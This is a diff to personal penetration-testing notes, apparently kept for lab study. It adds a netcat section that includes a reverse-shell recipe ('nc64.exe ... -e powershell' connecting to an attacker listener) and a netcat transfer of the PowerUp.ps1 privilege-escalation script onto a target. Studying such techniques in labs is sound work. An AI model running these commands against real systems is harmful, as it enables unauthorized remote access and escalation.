@@ -84,9 +84,9 @@ If that doesn't work check the inside the file
 
 for visual code projects on kali you basically have to install Visual Code for Kali as far as I'm aware. 
 ========================================================================================
+Netcat Tricks
 
 Using nc64.exe to create a shell
-
 
 Attacker
 rlwrap nc -lvp 1234
@@ -94,3 +94,10 @@ rlwrap nc -lvp 1234
 Target:
 nc64.exe 192.168.45.237 1234 -e powershell
 Note: Stupid mistake, dont use -sh on a windows system, use -e powershell or -e cmd
+
+Quickly send a file
+Attacker
+ nc -nv 192.168.207.75 4444 < PowerUp.ps1
+
+Target
+ C:\tools\.\nc64.exe -nlvp 4444 > PowerUp.ps1
